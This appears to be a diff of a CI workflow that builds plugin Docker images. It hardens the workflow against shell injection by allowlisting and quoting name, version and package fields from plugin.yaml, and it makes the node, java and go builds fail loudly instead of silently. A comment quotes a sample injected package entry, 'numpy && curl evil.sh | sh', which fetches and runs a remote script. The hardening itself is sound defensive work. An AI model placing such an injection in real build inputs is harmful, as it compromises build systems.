@@ -75,6 +75,18 @@ jobs:
             RUNTIME="python"
           fi
 
+          # Allowlist name/version before they flow into image tags or the
+          # generated Dockerfile -- plugin.yaml is untrusted input from the
+          # submission's perspective (SEC-001/SEC-002).
+          if ! [[ "$NAME" =~ ^[a-z0-9][a-z0-9-]*$ ]]; then
+            echo "::error::plugin.yaml 'name: $NAME' in $PLUGIN_DIR contains disallowed characters (allowed: a-z 0-9 -)"
+            exit 1
+          fi
+          if ! [[ "$VERSION" =~ ^[0-9]+\.[0-9]+\.[0-9]+([A-Za-z0-9.+-]*)?$ ]]; then
+            echo "::error::plugin.yaml 'version: $VERSION' in $PLUGIN_DIR is not a valid semver-ish version"
+            exit 1
+          fi
+
           echo "runtime=$RUNTIME" >> "$GITHUB_OUTPUT"
           echo "version=$VERSION" >> "$GITHUB_OUTPUT"
           echo "name=$NAME" >> "$GITHUB_OUTPUT"
@@ -104,38 +116,68 @@ jobs:
 
           case "$RUNTIME" in
             python)
-              # Python: copy plugin code, install deps if any
-              DEPS=$(grep -A100 'packages:' "$PLUGIN_DIR/plugin.yaml" | grep -E '^\s+-\s+' | sed 's/^\s*-\s*//' | tr '\n' ' ' || echo "")
+              # Python: copy plugin code, install deps if any. Each package
+              # entry is allowlisted (SEC-001: plugin.yaml is untrusted --
+              # `numpy && curl evil.sh | sh` must not become part of the
+              # RUN line's shell command) and shell-quoted (%q) as
+              # defense-in-depth on top of the allowlist.
+              DEPS=""
+              while IFS= read -r pkg; do
+                [ -z "$pkg" ] && continue
+                if ! [[ "$pkg" =~ ^[A-Za-z0-9][A-Za-z0-9._-]*(\[[A-Za-z0-9,_-]+\])?([<>=!~]=?[A-Za-z0-9.*]+)*$ ]]; then
+                  echo "::error::$PLUGIN_DIR/plugin.yaml packages entry '$pkg' contains disallowed characters"
+                  exit 1
+                fi
+                DEPS="$DEPS $(printf '%q' "$pkg")"
+              done < <(grep -A100 'packages:' "$PLUGIN_DIR/plugin.yaml" | grep -E '^\s+-\s+' | sed 's/^\s*-\s*//')
               cat > "$PLUGIN_DIR/Dockerfile" <<DOCKERFILE
           FROM $BASE
           WORKDIR /app/plugin
           COPY . .
           DOCKERFILE
               if [ -n "$DEPS" ]; then
-                echo "RUN uv pip install --system --no-cache-dir $DEPS" >> "$PLUGIN_DIR/Dockerfile"
+                echo "RUN uv pip install --system --no-cache-dir$DEPS" >> "$PLUGIN_DIR/Dockerfile"
               fi
               ;;
             node)
+              # sre-001: actually build the TypeScript before shipping the
+              # image -- `dist/index.js` (package.json main) never existed
+              # under the old install-only, --omit=dev, || true pipeline.
               cat > "$PLUGIN_DIR/Dockerfile" <<DOCKERFILE
           FROM $BASE
           WORKDIR /app/plugin
           COPY . .
-          RUN if [ -f package.json ]; then npm install --omit=dev 2>/dev/null || true; fi
+          RUN if [ -f package.json ]; then npm install --include=dev; fi
+          RUN if [ -f package.json ] && grep -q '"build"' package.json; then npm run build; fi
+          RUN if [ -f package.json ]; then npm prune --omit=dev; fi
           DOCKERFILE
               ;;
             java)
+              # sre-001: compile before shipping. This assumes the java
+              # runtime base image exposes the stria SDK on javac's default
+              # classpath, mirroring the documented "SDK baked into the base
+              # image" convention used by the go (go.mod replace => /app/sdk-go)
+              # and node (package.json => file:/app/sdk-ts.tgz) runtimes --
+              # the java runtime image has no equivalent documented path, so
+              # this is the ceiling of what's verifiable from this repo. If
+              # the assumption is wrong the build now fails loudly (was:
+              # unverified, silently shipped as raw uncompiled source).
               cat > "$PLUGIN_DIR/Dockerfile" <<DOCKERFILE
           FROM $BASE
           WORKDIR /app/plugin
           COPY . .
+          RUN javac -d /app/plugin/classes *.java
           DOCKERFILE
               ;;
             go)
+              # sre-001: build, don't just download -- and don't swallow
+              # errors with `|| true`, which let a broken module resolve
+              # silently.
               cat > "$PLUGIN_DIR/Dockerfile" <<DOCKERFILE
           FROM $BASE
           WORKDIR /app/plugin
           COPY . .
-          RUN go mod download 2>/dev/null || true
+          RUN GOFLAGS=-mod=mod go build -o /app/plugin/bin/plugin ./...
           DOCKERFILE
               ;;
           esac
